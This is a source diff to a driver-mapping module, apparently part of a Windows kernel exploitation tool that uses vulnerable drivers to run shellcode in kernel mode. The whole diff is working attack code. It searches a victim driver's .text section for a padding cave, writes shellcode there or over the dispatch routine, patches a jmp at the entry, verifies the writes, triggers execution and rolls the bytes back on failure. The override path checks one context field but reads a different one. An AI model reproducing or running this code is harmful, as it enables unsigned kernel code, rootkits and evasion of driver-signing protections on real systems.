@@ -4,9 +4,9 @@
 *
 *  TITLE:       DRVMAP.CPP
 *
-*  VERSION:     1.50
+*  VERSION:     1.51
 *
-*  DATE:        19 Jul 2026
+*  DATE:        14 Nov 2026
 *
 *  Driver mapping routines.
 *
@@ -29,12 +29,15 @@
 */
 VOID KDUShowPayloadResult(
     _In_ PKDU_CONTEXT Context,
-    _In_ HANDLE SectionHandle
+    _In_ HANDLE SectionHandle,
+    _In_ BOOL EventSignaled
 )
 {
     NTSTATUS ntStatus;
     ULONG payloadSize = 0;
+    NTSTATUS payloadStatus;
     SIZE_T viewSize;
+    ULONG_PTR payloadInformation;
 
     union {
         union {
@@ -61,36 +64,118 @@ VOID KDUShowPayloadResult(
         0,
         PAGE_READONLY);
 
-    if (NT_SUCCESS(ntStatus) && pvPayloadHead.Ref) {
-
-        switch (Context->ShellVersion) {
-
-        case KDU_SHELLCODE_V2:
-
-            supPrintfEvent(kduEventInformation,
-                "[~] Shellcode result, system worker: 0x%p\r\n",
-                (PVOID)pvPayloadHead.Version.v1->IoStatus.Information);
-
-            break;
-
-        case KDU_SHELLCODE_V3:
-        case KDU_SHELLCODE_V1:
-        default:
-
-            supPrintfEvent(kduEventInformation,
-                "[~] Shellcode result: NTSTATUS (0x%lX)\r\n", pvPayloadHead.Version.v1->IoStatus.Status);
-
-            break;
-        }
-
-        NtUnmapViewOfSection(NtCurrentProcess(), pvPayloadHead.Ref);
-    }
-    else {
-
+    if (!NT_SUCCESS(ntStatus) || pvPayloadHead.Ref == NULL) {
         supPrintfEvent(kduEventError,
             "[!] Cannot map shellcode section, NTSTATUS (%lX)\r\n", ntStatus);
-
+        return;
     }
+
+    //
+    // IoStatus is at a version-independent offset.
+    //
+    payloadStatus = pvPayloadHead.Version.v1->IoStatus.Status;
+    payloadInformation = pvPayloadHead.Version.v1->IoStatus.Information;
+
+    supPrintfEvent(kduEventInformation,
+        "[~] Shellcode result: NTSTATUS (0x%lX)\r\n", (ULONG)payloadStatus);
+
+    switch (Context->ShellVersion) {
+
+    case KDU_SHELLCODE_V2:
+        supPrintfEvent(kduEventInformation,
+            "[~] V2: status reports work item queuing, not payload completion\r\n");
+        supPrintfEvent(kduEventInformation,
+            "[~] System worker: 0x%p\r\n", (PVOID)payloadInformation);
+        break;
+
+    case KDU_SHELLCODE_V3:
+        supPrintfEvent(kduEventInformation,
+            "[~] V3: final stage result (driver object creation or DriverEntry)\r\n");
+        break;
+
+    case KDU_SHELLCODE_V4:
+    case KDU_SHELLCODE_V1:
+    default:
+        supPrintfEvent(kduEventInformation,
+            "[~] V1/V4: status reports system thread creation, not DriverEntry result\r\n");
+        break;
+    }
+
+    if (payloadStatus == STATUS_UNSUCCESSFUL) {
+        if (EventSignaled) {
+            supPrintfEvent(kduEventWarning,
+                "[~] Pre-map initializer, but stager signalled: it ran and failed before storing a result (section map or pool allocation)\r\n");
+        }
+        else {
+            supPrintfEvent(kduEventInformation,
+                "[~] Pre-map initializer, no signal: stager never ran, or failed to reference the payload section\r\n");
+        }
+    }
+
+    NtUnmapViewOfSection(NtCurrentProcess(), pvPayloadHead.Ref);
+}
+
+/*
+* KDUpFindCodeCave
+*
+* Purpose:
+*
+* Find a run of padding bytes inside the victim .text section large enough for the
+* shellcode and not crossing a page boundary.
+*
+* Keeps neighbouring functions intact.
+*
+*/
+BOOL KDUpFindCodeCave(
+    _In_ PVOID ImageBase,
+    _In_ ULONG NeedSize,
+    _Out_ PULONG CaveOffset)
+{
+    ULONG sectionSize = 0, pass;
+    PBYTE section;
+
+    *CaveOffset = 0;
+    if (ImageBase == NULL || NeedSize == 0)
+        return FALSE;
+
+    section = (PBYTE)ntsupLookupImageSectionByName(
+        (CHAR*)TEXT_SECTION,
+        TEXT_SECTION_LENGTH,
+        ImageBase,
+        &sectionSize);
+
+    if (!section || sectionSize < NeedSize)
+        return FALSE;
+
+    // Prefer 0xCC (int3 fill, 0x0 as fallback).
+    for (pass = 0; pass < 2; ++pass) {
+
+        BYTE filler = (pass == 0) ? 0xCC : 0x00;
+        ULONG run = 0, runStart = 0;
+
+        for (ULONG i = 0; i < sectionSize; ++i) {
+
+            if (section[i] == filler) {
+
+                if (run == 0) runStart = i;
+                ++run;
+
+                if (run >= NeedSize) {
+
+                    ULONG rva = (ULONG)((PBYTE)(section + runStart) - (PBYTE)ImageBase);
+                    if (((rva & 0xfff) + NeedSize) <= PAGE_SIZE) {
+                        *CaveOffset = rva;
+                        return TRUE;
+                    }
+                    run = 0;
+                }
+            }
+            else {
+                run = 0;
+            }
+        }
+    }
+    return FALSE;
 }
 
 /*
@@ -471,6 +556,13 @@ BOOL WINAPI KDUPagePatchCallback(
     ULONG dispatchPageOffset = Params->DispatchHandlerPageOffset;
 
     BYTE buffer[PAGE_SIZE];
+
+    //
+    // Signature must fit inside the page buffer.
+    //
+    if ((SIZE_T)dispatchPageOffset + signatureSize > PAGE_SIZE)
+        return FALSE;
+
     RtlSecureZeroMemory(&buffer, sizeof(buffer));
 
     if (ReadPhysicalMemory(Params->DeviceHandle,
@@ -583,7 +675,7 @@ BOOL KDUDriverMapInit(
             "[!] Error building the ready event handle, abort\r\n");
 
         ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));
-        
+
         if (sectionHandle) {
             NtClose(sectionHandle);
             sectionHandle = NULL;
@@ -623,81 +715,190 @@ BOOL KDUpMapDriverPhysicalTranslate(
     KDU_PROVIDER* prov = Context->Provider;
     KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
 
-    ULONG dispatchPageOffset = VictimImageInformation->DispatchPageOffset;
-    ULONG_PTR memPage, targetAddress = TargetAddress;
-
+    provReadKernelVM ReadKernelVM = prov->Callbacks.ReadKernelVM;
     provWriteKernelVM WriteKernelVM = prov->Callbacks.WriteKernelVM;
+
+    ULONG_PTR stagerAddress = TargetAddress;
+    BOOL entryIsJmp = FALSE;
+    BOOL wroteStager = FALSE, wroteEntry = FALSE;
+
+    //
+    // If the shellcode would cross a page at the dispatch, park it at the head of that
+    // page and leave a 5-byte jmp at the dispatch. Otherwise write it at the dispatch.
+    //
+    if ((SIZE_T)VictimImageInformation->DispatchPageOffset + ScSize > PAGE_SIZE) {
+        stagerAddress = TargetAddress - VictimImageInformation->DispatchPageOffset;
+        entryIsJmp = TRUE;
+    }
+
+    //
+    // rel32 derived from real addresses (independent of the JumpValue field).
+    //
+    BYTE jmpcode[5] = { 0xE9, 0, 0, 0, 0 };
+    *(LONG*)&jmpcode[1] = (LONG)(stagerAddress - TargetAddress - 5);
+
+    //
+    // Archive exactly the regions that will be written.
+    //
+    BYTE  originalEntryJmp[5] = { 0 };
+    PVOID originalStager = NULL, originalEntry = NULL;
+    BOOL  haveEntryJmp = FALSE, haveStager = FALSE, haveEntry = FALSE;
+
+    if (entryIsJmp) {
+
+        haveEntryJmp = ReadKernelVM(deviceHandle,
+            TargetAddress,
+            originalEntryJmp,
+            sizeof(originalEntryJmp)) != FALSE;
+
+        originalStager = supHeapAlloc(ScSize);
+        if (originalStager) {
+            haveStager = ReadKernelVM(deviceHandle,
+                stagerAddress,
+                originalStager,
+                ScSize) != FALSE;
+        }
+    }
+    else {
+        originalEntry = supHeapAlloc(ScSize);
+        if (originalEntry) {
+            haveEntry = ReadKernelVM(deviceHandle,
+                TargetAddress,
+                originalEntry,
+                ScSize) != FALSE;
+        }
+    }
+
+    //
+    // No rollback possible if we couldn't archive - refuse to patch.
+    //
+    if (entryIsJmp ? (!haveEntryJmp || !haveStager) : !haveEntry) {
+        supPrintfEvent(kduEventError, "[!] Cannot archive original victim bytes, refusing to patch\r\n");
+        if (originalStager)
+            supHeapFree(originalStager);
+        if (originalEntry)
+            supHeapFree(originalEntry);
+        return FALSE;
+    }
 
     do {
 
-        if ((SIZE_T)dispatchPageOffset + (SIZE_T)ScSize > PAGE_SIZE) {
-
-            memPage = (TargetAddress & 0xfffffffffffff000ull);
-            printf_s("[~] Shellcode overlaps page boundary, switching target memory address to 0x%llX\r\n", memPage);
-
-            unsigned char jmpcode[] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };
-
-            *(PULONG)&jmpcode[1] = VictimImageInformation->JumpValue;
-
-            printf_s("\t>> Setting jump[%lX][%lX] at address 0x%llX\r\n",
-                jmpcode[0],
-                *(PULONG)&jmpcode[1],
-                TargetAddress);
-
-            if (!WriteKernelVM(deviceHandle, TargetAddress, &jmpcode, sizeof(jmpcode))) {
-
-                supPrintfEvent(kduEventError,
-                    "[!] Error writting kernel memory, abort\r\n");
-
+        if (entryIsJmp) {
+            printf_s("[~] Shellcode overlaps page boundary, stager goes to 0x%llX\r\n", stagerAddress);
+            if (!WriteKernelVM(deviceHandle, TargetAddress, jmpcode, sizeof(jmpcode))) {
+                supPrintfEvent(kduEventError, "[!] Error writing kernel memory, abort\r\n");
                 break;
-
-            }
-            else {
-
-                targetAddress = TargetAddress - dispatchPageOffset;
-
             }
 
+            wroteEntry = TRUE;
         }
 
         //
-        // Write shellcode to kernel.
+        // Write shellcode.
         //
-        printf_s("[+] Writing shellcode at 0x%llX address with size 0x%lX\r\n", targetAddress, ScSize);
+        printf_s("[+] Writing shellcode at 0x%llX address with size 0x%lX\r\n", stagerAddress, ScSize);
+        if (!WriteKernelVM(deviceHandle, stagerAddress, ScBuffer, ScSize)) {
+            supPrintfEvent(kduEventError, "[!] Error writing kernel memory, abort\r\n");
+            break;
+        }
 
-        if (!WriteKernelVM(deviceHandle, targetAddress, ScBuffer, ScSize)) {
+        wroteStager = TRUE;
 
+        //
+        // Verify shellcode write.
+        //
+        PVOID verifyBuffer = supHeapAlloc(ScSize);
+        if (verifyBuffer == NULL) {
+            supPrintfEvent(kduEventError, "[!] Cannot allocate verify buffer, abort\r\n");
+            break;
+        }
+
+        BOOL verified = ReadKernelVM(deviceHandle,
+            stagerAddress,
+            verifyBuffer,
+            ScSize) && RtlCompareMemory(verifyBuffer, ScBuffer, ScSize) == ScSize;
+
+        supHeapFree(verifyBuffer);
+
+        if (!verified) {
             supPrintfEvent(kduEventError,
-                "[!] Error writting kernel memory, abort\r\n");
+                "[!] Shellcode readback mismatch at 0x%llX, refusing to execute\r\n", stagerAddress);
             break;
         }
 
         //
-        // Execute shellcode.
+        // Verify the entry jmp too (if set).
         //
+        if (entryIsJmp) {
+            BYTE check[5];
+            if (!ReadKernelVM(deviceHandle, TargetAddress, check, sizeof(check)) ||
+                RtlCompareMemory(check, jmpcode, sizeof(check)) != sizeof(check))
+            {
+                supPrintfEvent(kduEventError, "[!] Entry jmp readback mismatch, refusing to execute\r\n");
+                break;
+            }
+        }
+
         printf_s("[+] Executing shellcode\r\n");
         VpExecutePayload(victimProv, &victimDeviceHandle);
+        if (victimDeviceHandle == NULL)
+            supPrintfEvent(kduEventError, "[!] Victim device open failed, stager never invoked\r\n");
 
-        //
-        // Wait for the shellcode to trigger the event
-        //
-        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {
+        if (WaitForSingleObject(ReadyEventHandle, KDU_SHELLCODE_TIMEOUT_MS) != WAIT_OBJECT_0) {
 
             supPrintfEvent(kduEventError,
-                "[!] Shellcode did not trigger the event within two seconds.\r\n");
+                "[!] Shellcode did not trigger the event within %lu ms.\r\n", (ULONG)KDU_SHELLCODE_TIMEOUT_MS);
+            printf_s("[!] Payload result as left by the shellcode:\r\n");
 
         }
-        else
-        {
-            KDUShowPayloadResult(Context, ScSectionHandle);
+        else {
             bSuccess = TRUE;
         }
+
+        KDUShowPayloadResult(Context, ScSectionHandle, bSuccess);
+
 
     } while (FALSE);
 
     //
-    // Ensure victim handle is closed.
+    // Restore only what was written.
     //
+    if (!bSuccess) {
+        if (wroteStager || wroteEntry) {
+
+            BOOL restored = TRUE;
+
+            if (wroteEntry && haveEntryJmp) {
+                restored &= WriteKernelVM(deviceHandle,
+                    TargetAddress,
+                    originalEntryJmp,
+                    sizeof(originalEntryJmp));
+            }
+            if (entryIsJmp && wroteStager && haveStager) {
+                restored &= WriteKernelVM(deviceHandle,
+                    stagerAddress,
+                    originalStager,
+                    ScSize);
+            }
+            if (!entryIsJmp && wroteStager && haveEntry) {
+                restored &= WriteKernelVM(deviceHandle,
+                    TargetAddress,
+                    originalEntry,
+                    ScSize);
+            }
+
+            printf_s(restored ? "[+] Victim bytes restored after failure\r\n" : "[!] Could not restore victim bytes, expect instability\r\n");
+        }
+    }
+
+    //
+    // Cleanup.
+    //
+    if (originalStager)
+        supHeapFree(originalStager);
+    if (originalEntry)
+        supHeapFree(originalEntry);
+
     if (victimDeviceHandle) {
         NtClose(victimDeviceHandle);
         victimDeviceHandle = NULL;
@@ -751,23 +952,20 @@ BOOL KDUpMapDriverPhysicalBruteForce(
         //
         // Wait for the shellcode to trigger the event
         //
-        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {
-
+        if (WaitForSingleObject(ReadyEventHandle, KDU_SHELLCODE_TIMEOUT_MS) != WAIT_OBJECT_0) {
             supPrintfEvent(kduEventError,
-                "[!] Shellcode did not trigger the event within two seconds.\r\n");
-
+                "[!] Shellcode did not trigger the event within %lu ms.\r\n", (ULONG)KDU_SHELLCODE_TIMEOUT_MS);
         }
         else
         {
-            KDUShowPayloadResult(Context, ScSectionHandle);
             bSuccess = TRUE;
         }
 
+        KDUShowPayloadResult(Context, ScSectionHandle, bSuccess);
+
     }
     else {
-        supPrintfEvent(kduEventError,
-            "[!] Failed to enumerate physical memory.\r\n");
-
+        supPrintfEvent(kduEventError, "[!] Failed to enumerate physical memory.\r\n");
     }
 
     //
@@ -795,56 +993,189 @@ BOOL KDUpMapDriverDirectVM(
     _In_ ULONG ScSize,
     _In_ HANDLE ScSectionHandle,
     _In_ HANDLE ReadyEventHandle,
-    _In_ ULONG_PTR TargetAddress
+    _In_ ULONG_PTR TargetAddress,
+    _In_ ULONG_PTR StagerAddress
 )
 {
     BOOL bSuccess = FALSE;
+
+    BOOL usingCave = (StagerAddress != TargetAddress);
+    BOOL wroteStager = FALSE, wroteEntryJmp = FALSE;
+
     KDU_PROVIDER* prov = Context->Provider;
     KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
     HANDLE victimDeviceHandle = NULL;
 
-    //
-    // Write shellcode to driver.
-    //
-    if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
-        TargetAddress,
-        ScBuffer,
-        ScSize))
-    {
+    provReadKernelVM ReadKernelVM = prov->Callbacks.ReadKernelVM;
+    provWriteKernelVM WriteKernelVM = prov->Callbacks.WriteKernelVM;
 
-        supPrintfEvent(kduEventError,
-            "[!] Error writing shellcode to the target driver, abort\r\n");
+    //
+    // Archive exactly what will be overwritten:
+    //   cave mode   -> 5 entry bytes + ScSize cave bytes
+    //   legacy mode -> ScSize entry bytes
+    //
+    BYTE  originalEntryJmp[5] = { 0 };
+    PVOID originalStager = NULL, originalEntry = NULL;
+    BOOL  haveEntryJmp = FALSE, haveStager = FALSE, haveEntry = FALSE;
+    BYTE  jmpcode[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
 
+    if (usingCave) {
+        *(LONG*)&jmpcode[1] = (LONG)(StagerAddress - TargetAddress - 5);
+
+        haveEntryJmp = ReadKernelVM(Context->DeviceHandle,
+            TargetAddress,
+            originalEntryJmp,
+            sizeof(originalEntryJmp)) != FALSE;
+
+        originalStager = supHeapAlloc(ScSize);
+        if (originalStager) {
+            haveStager = ReadKernelVM(Context->DeviceHandle,
+                StagerAddress,
+                originalStager,
+                ScSize) != FALSE;
+        }
     }
     else {
+        originalEntry = supHeapAlloc(ScSize);
+        if (originalEntry) {
+            haveEntry = ReadKernelVM(Context->DeviceHandle,
+                TargetAddress,
+                originalEntry,
+                ScSize) != FALSE;
+        }
+    }
+
+    //
+    // No rollback possible if we couldn't archive - refuse to patch.
+    //
+    if (usingCave ? (!haveEntryJmp || !haveStager) : !haveEntry) {
+        supPrintfEvent(kduEventError, "[!] Cannot archive original victim bytes, refusing to patch\r\n");
+        if (originalStager) 
+            supHeapFree(originalStager);
+        if (originalEntry)  
+            supHeapFree(originalEntry);
+
+        return FALSE; 
+    }
+
+    do {
+
+        if (!WriteKernelVM(Context->DeviceHandle,
+            StagerAddress,
+            ScBuffer,
+            ScSize))
+        {
+            supPrintfEvent(kduEventError, "[!] Error writing shellcode to the target driver, abort\r\n");
+            break;
+        }
+
+        wroteStager = TRUE;
+
+        if (usingCave) {
+            printf_s("[+] Patching victim entry 0x%llX -> stager 0x%llX (jmp rel32 %ld)\r\n",
+                TargetAddress, StagerAddress, *(LONG*)&jmpcode[1]);
+
+            if (!WriteKernelVM(Context->DeviceHandle,
+                TargetAddress,
+                jmpcode,
+                sizeof(jmpcode)))
+            {
+                supPrintfEvent(kduEventError, "[!] Error patching victim entry point, abort\r\n");
+                break;
+            }
+
+            wroteEntryJmp = TRUE;
+        }
+
+        //
+        // Fail-closed verification.
+        //
+        PVOID verifyBuffer = supHeapAlloc(ScSize);
+        if (verifyBuffer == NULL) {
+            supPrintfEvent(kduEventError, "[!] Cannot allocate verify buffer, abort\r\n");
+            break;
+        }
+
+        BOOL verified = ReadKernelVM(Context->DeviceHandle,
+            StagerAddress,
+            verifyBuffer,
+            ScSize) && RtlCompareMemory(verifyBuffer, ScBuffer, ScSize) == ScSize;
+
+        supHeapFree(verifyBuffer);
+
+        if (!verified) {
+            supPrintfEvent(kduEventError,
+                "[!] Shellcode readback mismatch at 0x%llX, refusing to execute\r\n", StagerAddress);
+            break;
+        }
+
+        if (usingCave) {
+
+            BYTE check[5];
+            if (!ReadKernelVM(Context->DeviceHandle,
+                TargetAddress,
+                check,
+                sizeof(check)) || RtlCompareMemory(check, jmpcode, sizeof(check)) != sizeof(check))
+            {
+                supPrintfEvent(kduEventError, "[!] Entry jmp readback mismatch, refusing to execute\r\n");
+                break;
+            }
+        }
 
         printf_s("[+] Driver handler code modified\r\n");
-
-        //
-        // Execute shellcode.
-        //
         printf_s("[+] Executing shellcode\r\n");
         VpExecutePayload(victimProv, &victimDeviceHandle);
 
-        //
-        // Wait for the shellcode to trigger the event
-        //
-        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {
+        if (victimDeviceHandle == NULL)
+            supPrintfEvent(kduEventError, "[!] Victim device open failed, stager never invoked\r\n");
 
+        if (WAIT_OBJECT_0 != WaitForSingleObject(ReadyEventHandle, KDU_SHELLCODE_TIMEOUT_MS)) {
             supPrintfEvent(kduEventError,
-                "[!] Shellcode did not trigger the event within two seconds.\r\n");
-
+                "[!] Shellcode did not trigger the event within %lu ms.\r\n", (ULONG)KDU_SHELLCODE_TIMEOUT_MS);
+            printf_s("[!] Payload result as left by the shellcode:\r\n");
         }
-        else
-        {
-            KDUShowPayloadResult(Context, ScSectionHandle);
+        else {
             bSuccess = TRUE;
         }
-    }
+
+        KDUShowPayloadResult(Context, ScSectionHandle, bSuccess);
+
+    } while (FALSE);
 
     //
-    // Ensure victim handle is closed.
+    // Restore only bytes actually written, at their exact granularity.
     //
+    if (!bSuccess && (wroteStager || wroteEntryJmp)) {
+
+        BOOL restored = TRUE;
+        if (wroteEntryJmp && haveEntryJmp) {
+            restored &= WriteKernelVM(Context->DeviceHandle,
+                TargetAddress,
+                originalEntryJmp,
+                sizeof(originalEntryJmp));
+        }
+        if (usingCave && wroteStager && haveStager) {
+            restored &= WriteKernelVM(Context->DeviceHandle,
+                StagerAddress,
+                originalStager,
+                ScSize);
+        }
+        if (!usingCave && wroteStager && haveEntry) {
+            restored &= WriteKernelVM(Context->DeviceHandle,
+                TargetAddress,
+                originalEntry,
+                ScSize);
+        }
+
+        printf_s(restored ? "[+] Victim bytes restored after failure\r\n"
+            : "[!] Could not restore victim bytes, expect instability\r\n");
+    }
+
+    if (originalStager)
+        supHeapFree(originalStager);
+    if (originalEntry)
+        supHeapFree(originalEntry);
+
     if (victimDeviceHandle) {
         NtClose(victimDeviceHandle);
         victimDeviceHandle = NULL;
@@ -877,6 +1208,7 @@ BOOL KDUMapDriver(
     VICTIM_LOAD_PARAMETERS viLoadParams;
 
     ULONG dispatchOffset = 0;
+    ULONG cbShellCode = ScSizeOf(Context->ShellVersion, NULL);
 
     FUNCTION_ENTER_MSG(__FUNCTION__);
 
@@ -906,7 +1238,6 @@ BOOL KDUMapDriver(
         // Query all required victim information.
         //
         RtlSecureZeroMemory(&vi, sizeof(vi));
-
         printf_s("[+] Query victim image information\r\n");
 
         if (VpQueryInformation(
@@ -917,8 +1248,21 @@ BOOL KDUMapDriver(
         {
             dispatchOffset = vi.DispatchOffset;
 
-            RtlSecureZeroMemory(&vdi, sizeof(vdi));
+            //
+            // Optional caller override of the signature-matched RVA (for stale signatures).
+            // Currently unused.
+            //
+            if (Context->DispatchRva != 0) {
+                ULONG overrideRva = (ULONG)Context->ArbitraryData;
+                printf_s("[+] Victim dispatch RVA override: 0x%lX (signature said 0x%lX)\r\n",
+                    overrideRva, dispatchOffset);
+                dispatchOffset = overrideRva;
+                vi.DispatchOffset = overrideRva;
+                vi.DispatchPageOffset = overrideRva & 0xfff;
+                vi.JumpValue = (ULONG)(LONG)((overrideRva & ~0xfffu) - overrideRva - 5);
+            }
 
+            RtlSecureZeroMemory(&vdi, sizeof(vdi));
             printf_s("[+] Query victim loaded driver layout\r\n");
 
             if (VpQueryInformation(
@@ -927,9 +1271,39 @@ BOOL KDUMapDriver(
                 &vdi,
                 sizeof(vdi)))
             {
+                printf_s("[+] Victim layout: base 0x%llX size 0x%lX, dispatch offset 0x%lX\r\n",
+                    vdi.LoadedImageBase, vdi.ImageSize, dispatchOffset);
+
+                if (vdi.ImageSize == 0 || (ULONGLONG)dispatchOffset + 5 > vdi.ImageSize) {
+                    supPrintfEvent(kduEventError,
+                        "[!] Dispatch offset 0x%lX outside victim image (size 0x%lX), abort\r\n",
+                        dispatchOffset, vdi.ImageSize);
+                    break;
+                }
+
+                //
+                // Stager lands at the dispatch page head when it would cross a page, 
+                // otherwise at the dispatch itself. Must fit the image.
+                //
+                if (Context->Provider->LoadData->RootTableFromLowStub ||
+                    Context->Provider->LoadData->PreferPhysical)
+                {
+                    ULONG_PTR stagerRva;
+
+                    if ((SIZE_T)vi.DispatchPageOffset + cbShellCode > PAGE_SIZE)
+                        stagerRva = dispatchOffset - vi.DispatchPageOffset;
+                    else
+                        stagerRva = dispatchOffset;
+
+                    if ((ULONGLONG)stagerRva + cbShellCode > vdi.ImageSize) {
+                        supPrintfEvent(kduEventError,
+                            "[!] Stager at rva 0x%llX (+0x%lX) past image end, abort\r\n",
+                            (ULONG64)stagerRva, cbShellCode);
+                        break;
+                    }
+                }
 
                 targetAddress = vdi.LoadedImageBase + dispatchOffset;
-
             }
             else {
                 supShowWin32Error("[!] Cannot query victim driver layout", GetLastError());
@@ -958,8 +1332,6 @@ BOOL KDUMapDriver(
         {
             break;
         }
-
-        ULONG cbShellCode = ScSizeOf(Context->ShellVersion, NULL);
 
         //
         // Select proper handling depending on exploitable driver type.
@@ -1007,17 +1379,59 @@ BOOL KDUMapDriver(
                 //
                 // 3. Direct VM write primitive available.
                 //
+
+                BOOL usingCave = FALSE;
+                ULONG caveRva = 0;
+                ULONG_PTR stagerAddress = targetAddress;
+
+                if (KDUpFindCodeCave(Context->Victim->Data.VictimImage,
+                    cbShellCode,
+                    &caveRva))
+                {
+                    if ((ULONGLONG)caveRva + cbShellCode <= vdi.ImageSize) {
+                        stagerAddress = vdi.LoadedImageBase + caveRva;
+                        usingCave = TRUE;
+                        printf_s("[+] Code cave: rva 0x%lX -> 0x%llX, shellcode 0x%lX bytes\r\n",
+                            caveRva, stagerAddress, cbShellCode);
+                    }
+                    else {
+                        supPrintfEvent(kduEventWarning,
+                            "[~] Code cave 0x%lX outside victim image, using entry overwrite\r\n", caveRva);
+                    }
+                }
+                else {
+                    supPrintfEvent(kduEventWarning,
+                        "[~] No code cave for 0x%lX bytes, using entry overwrite\r\n", cbShellCode);
+                }
+
+                if (!usingCave && (ULONGLONG)dispatchOffset + cbShellCode > vdi.ImageSize) {
+
+                    supPrintfEvent(kduEventError,
+                        "[!] No cave and 0x%lX bytes at rva 0x%lX run past image end, abort\r\n",
+                        cbShellCode, dispatchOffset);
+
+                    if (readyEventHandle)
+                        CloseHandle(readyEventHandle);
+                    if (sectionHandle)
+                        NtClose(sectionHandle);
+
+                    break;
+                }
+
                 bSuccess = KDUpMapDriverDirectVM(Context,
                     pvShellCode,
                     cbShellCode,
                     sectionHandle,
                     readyEventHandle,
-                    targetAddress);
+                    targetAddress,
+                    stagerAddress);
 
             }
 
-        if (readyEventHandle) CloseHandle(readyEventHandle);
-        if (sectionHandle) NtClose(sectionHandle);
+        if (readyEventHandle)
+            CloseHandle(readyEventHandle);
+        if (sectionHandle)
+            NtClose(sectionHandle);
 
     } while (FALSE);
 
@@ -1028,7 +1442,7 @@ BOOL KDUMapDriver(
         printf_s("[+] Victim released\r\n");
     }
 
-    if (pvShellCode) 
+    if (pvShellCode)
         ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));
 
     FUNCTION_LEAVE_MSG(__FUNCTION__);
